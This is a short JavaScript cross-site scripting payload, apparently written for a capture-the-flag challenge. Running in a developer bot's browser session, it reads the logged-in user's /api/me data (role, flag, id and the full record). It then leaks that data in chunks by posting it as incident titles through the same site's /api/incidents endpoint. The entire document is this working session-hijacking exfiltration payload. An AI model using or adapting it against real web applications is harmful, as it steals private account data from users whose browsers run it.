// PB: Simple - just read developer bot's /api/me for flag
(async () => {
  var O = self.location.origin;
  var P = function(t) {
    return fetch(O + '/api/incidents', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
    }).catch(function() {});
  };

  try {
    var r = await fetch(O + '/api/me', {credentials: 'same-origin'});
    var j = await r.json();
    var u = j.user || j;
    await P('PB|ME|role=' + u.role + '|flag=' + (u.flag || 'NONE') + '|id=' + u.id);
    // Dump full response in chunks
    var full = JSON.stringify(u);
    var n = Math.ceil(full.length / 85);
    for (var i = 0; i < n && i < 8; i++) {
      await P('PB|D|' + (i+1) + '/' + n + '|' + full.slice(i*85, (i+1)*85));
    }
  } catch(e) { await P('PB|ERR|' + e); }
  await P('PB|DONE');
})();
